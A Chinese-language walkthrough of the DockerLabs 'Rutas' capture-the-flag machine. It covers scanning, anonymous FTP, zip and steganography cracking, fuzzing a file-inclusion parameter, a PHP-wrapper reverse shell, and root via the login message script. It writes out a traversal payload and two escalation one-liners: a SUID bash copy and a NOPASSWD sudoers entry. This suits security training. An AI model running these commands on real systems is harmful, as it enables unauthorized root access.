---
title: "Dockerlabs-Rutas"
date: 2025-02-22
categories: 
  - "dockerlabs"
tags: 
  - "dockerlabs"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Medium |

## Nmap

```
[root@kali] /home/kali/Rutas  
❯ nmap 172.17.0.2 -sV  -A
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 19:23 CST
Nmap scan report for 172.17.0.2
Host is up (0.000066s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r-- 1 0        0               0 Jul 11  2024 hola_disfruta
|_-rw-r--r-- 1 0        0             293 Jul 11  2024 respeta.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.7p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 63:16:54:2a:05:1d:8e:43:53:55:8b:d5:4e:35:c9:1f (ECDSA)
|_  256 21:24:77:5d:f8:2f:b2:64:ec:42:8b:0b:ef:f0:46:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.07 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds
```

## FTP

存在匿名登录，并且可以下载文件

![](./images/image-94.png)

## ZIP Crack

```
[root@kali] /home/kali/Rutas  
❯ zip2john respeta.zip >> zip.hash  

[root@kali] /home/kali/Rutas  
❯ john zip.hash /usr/share/wordlists/rockyou.txt
```

![](./images/image-95.png)

```
[root@kali] /home/kali/Rutas  
❯ cat oculto.txt   
Consigue la imagen crackpass.jpg
firstatack.github.io
sin fuzzing con logica y observando la sacaras ,muy rapido

获取 crackpass.jpg 图像
firstatack.github.io
无需逻辑和观察，您就能很快明白。
```

在他的**github**仓库中得到这个图片

- [firstatack.github.io/assets/crackpass.jpg at main · firstatack/firstatack.github.io](https://github.com/firstatack/firstatack.github.io/blob/main/assets/crackpass.jpg)

使用**steghide**尝试进行分离，也可以用**stegseek**更快

```
[root@kali] /home/kali/Rutas  
❯ steghide extract -sf crackpass.jpg                      
Enter passphrase: 
wrote extracted data to "passwd.zip".

[root@kali] /home/kali/Rutas  
❯ unzip passwd.zip
Archive:  passwd.zip
 extracting: pass                    

[root@kali] /home/kali/Rutas  
❯ cat pass
hackeada:denuevo
```

## Dirsearch

```
[root@kali] /home/kali/Rutas  
❯ dirsearch -u 172.17.0.2 -t 50                                                                
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                    
                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Rutas/reports/_172.17.0.2/_25-02-22_19-29-36.txt

Target: http://172.17.0.2/

[19:29:36] Starting:                                                                                                                                       
[19:29:37] 403 - 275B  - /.ht_wsr.txt                                      
[19:29:37] 403 - 275B  - /.htaccess.bak1                                   
[19:29:37] 403 - 275B  - /.htaccess.sample
[19:29:37] 403 - 275B  - /.htaccess.save                                   
[19:29:37] 403 - 275B  - /.htaccess_extra                                  
[19:29:37] 403 - 275B  - /.htaccess_orig
[19:29:37] 403 - 275B  - /.htaccessBAK
[19:29:37] 403 - 275B  - /.htaccessOLD2                                    
[19:29:37] 403 - 275B  - /.htaccess.orig                                   
[19:29:37] 403 - 275B  - /.htm
[19:29:37] 403 - 275B  - /.html
[19:29:37] 403 - 275B  - /.htaccess_sc                                     
[19:29:37] 403 - 275B  - /.htpasswd_test                                   
[19:29:37] 403 - 275B  - /.htpasswds
[19:29:37] 403 - 275B  - /.httr-oauth                                      
[19:29:37] 403 - 275B  - /.htaccessOLD                                     
[19:29:37] 403 - 275B  - /.php                                             
[19:29:49] 200 - 615B  - /index.php                                        
[19:29:49] 200 - 615B  - /index.php/login/                                 
[19:29:56] 403 - 275B  - /server-status/                                   
[19:29:56] 403 - 275B  - /server-status
                                                                             
Task Completed          
```

## www-data

存在**index.php**，查看网页源码

![](./images/image-96.png)

将其添加到**/etc/hosts**

```
[root@kali] /home/kali/Rutas  
❯ cat /etc/hosts                                                                  
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

172.17.0.2      trackedvuln.dl vulndb.com dockerlabs.es
```

访问**trackedvuln.dl**会跳出一个登录框，使用上面的账户进行登录

没有可以直接利用的东西，这里对参数进行爆破，记得带上**Header**里的**token**

```
[root@kali] /home/kali/Rutas  
❯ ffuf -w ../Desktop/fuzzDicts/paramDict/AllParam.txt  -u 'http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd'  -t 50  -H "Authorization : Basic aGFja2VhZGE6ZGVudWV2bw==" -fs 901

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd
 :: Wordlist         : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt
 :: Header           : Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 901
________________________________________________

love                    [Status: 200, Size: 1079, Words: 172, Lines: 40, Duration: 5ms]
:: Progress: [74332/74332] :: Job [1/1] :: 7812 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

看来参数**love**返回值不太一样，但是似乎并不能直接读取到**/etc/passwd**

但是好像可以通过**PHP**伪协议进行操作

![](./images/image-97.png)

由于**GET**参数会存在**URL**转义的问题，因此我是这样构造的👇

![](./images/image-98.png)

拿到反弹**shell**

![](./images/image-99.png)

## User Maria

上传linpeas，似乎bash命令有特殊权限

![](./images/image-100.png)

![](./images/image-101.png)

进入**maria**的目录，拿到密码

![](./images/image-102.png)

使用**ssh**成功登录

## Root

在**linpeas**中可以看到**/etc/update-motd.d/00-header**

![](./images/image-104.png)

`/etc/update-motd.d/00-header` 是一个脚本文件，用于在每次用户登录时显示信息（Message of the Day，简称 MOTD）。具体来说，这个文件是 Linux 系统中用于定制用户登录后显示的内容的一部分。

一般来说这个脚本会以**root**的身份启动

因此只需要向里面追加提权的部分就行了

```
echo "cp /bin/bash /home/maria/bash && chmod u+s /home/maria/bash" >> /etc/update-motd.d/00-header
```

或者说

```
echo 'echo "maria ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/maria' >> /etc/update-motd.d/00-header
```

然后重新连接**ssh**即可

![](./images/image-105.png)

## Summary

`User`：**FTP**匿名登陆文件泄露，**ZIP**破解密码，分离图片。文件包含导致的**PHP**伪协议命令执行，我看其他的**Writeup**里面有用到**filterchains**，我的这个还是比较简单。

`Root`：给登录提示信息的脚本中添加提权部分，由于脚本会以**root**的身份启动，因此可以直接执行提权代码，方法也有很多。

**PS**：我看到**/home**目录下还有另一个用户**norberto**，我好像并没有用到，不知道是不是非预期。
